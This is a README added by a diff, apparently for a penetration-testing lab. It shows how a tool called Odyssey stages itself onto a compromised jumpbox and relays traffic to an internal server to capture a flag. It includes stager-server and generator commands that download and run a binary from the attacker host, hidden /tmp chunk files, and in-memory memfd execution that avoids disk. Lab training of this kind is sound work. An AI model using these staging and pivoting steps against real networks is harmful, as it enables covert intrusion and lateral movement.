@@ -1,0 +1,119 @@
+Odyssey Stager Lab
+==================
+
+Network layout:
+
+  pentester (10.10.10.3)  ---[pentest-net]---  jumpbox (10.10.10.2)  ---[internal-net]---  destiny (10.10.20.2)
+
+Roles:
+
+  pentester  has Odyssey installed, runs the stager-server
+  jumpbox    compromised host, only has bash (no Odyssey)
+  destiny    internal HTTP server with a flag
+
+The pentester cannot reach destiny directly. The jumpbox can reach
+both networks but has no tools installed.
+
+Goal: use the stager to deploy Odyssey on the jumpbox and pivot
+to destiny. Two methods are shown: a one-liner (no auth, fast)
+and a base64 mini-stager (token auth, in-memory execution).
+
+
+==============================================
+METHOD A: one-liner (no auth, raw download)
+==============================================
+
+----------------------------------------------
+STEP A1: pentester starts the stager-server
+----------------------------------------------
+
+  odyssey stager-server \
+    --listen 0.0.0.0:4444 \
+    --binary /usr/local/bin/odyssey \
+    --no-auth --single-use --verbose
+
+----------------------------------------------
+STEP A2: pentester generates the one-liner
+----------------------------------------------
+
+  In a second terminal on pentester:
+
+  odyssey stager --connect 10.10.10.3:4444 --os linux --format oneliner \
+    --run-args "relay --listen 0.0.0.0:8080 --to 10.10.20.2:80 --verbose"
+
+  Copy the output.
+
+----------------------------------------------
+STEP A3: paste on the jumpbox
+----------------------------------------------
+
+  Paste the one-liner in the jumpbox shell. Odyssey downloads
+  and starts a relay from jumpbox:8080 to destiny:80.
+
+----------------------------------------------
+STEP A4: pentester reaches destiny
+----------------------------------------------
+
+  From pentester:
+
+  curl http://10.10.10.2:8080
+
+  Expected: FLAG{odyssey_stager_works}
+
+
+==============================================
+METHOD B: base64 mini-stager (token auth, memfd)
+==============================================
+
+A pre-compiled mini-stager (~18 KB) is embedded in Odyssey.
+The generator patches it with the server address and token,
+encodes it as base64, and outputs ~13 lines that fit in
+terminal paste buffers. The mini-stager connects to the
+stager-server, authenticates, downloads Odyssey, and runs it
+in memory via memfd_create (Linux >= 3.17).
+
+----------------------------------------------
+STEP B1: pentester starts the stager-server with token
+----------------------------------------------
+
+  odyssey stager-server \
+    --listen 0.0.0.0:5555 \
+    --binary /usr/local/bin/odyssey \
+    --token "lab-stager-token-2026!" \
+    --args "relay --listen 0.0.0.0:9090 --to 10.10.20.2:80 --verbose" \
+    --single-use --verbose
+
+  Note: --args tells the server what arguments to send alongside
+  the binary. The mini-stager will pass them to Odyssey.
+
+----------------------------------------------
+STEP B2: pentester generates the base64 mini-stager
+----------------------------------------------
+
+  In a second terminal on pentester:
+
+  odyssey stager --connect 10.10.10.3:5555 --os linux \
+    --format base64 --token "lab-stager-token-2026!"
+
+  Copy the output (~13 lines).
+
+----------------------------------------------
+STEP B3: paste on the jumpbox
+----------------------------------------------
+
+  Paste the lines in the jumpbox shell. Each echo appends a
+  chunk to /tmp/.b. The last line decodes, executes the
+  mini-stager, which connects to the server, authenticates,
+  downloads Odyssey, and runs it with the args from step B1.
+  On kernels >= 3.17, execution happens in memory (no binary
+  on disk).
+
+----------------------------------------------
+STEP B4: pentester reaches destiny
+----------------------------------------------
+
+  From pentester:
+
+  curl http://10.10.10.2:9090
+
+  Expected: FLAG{odyssey_stager_works}
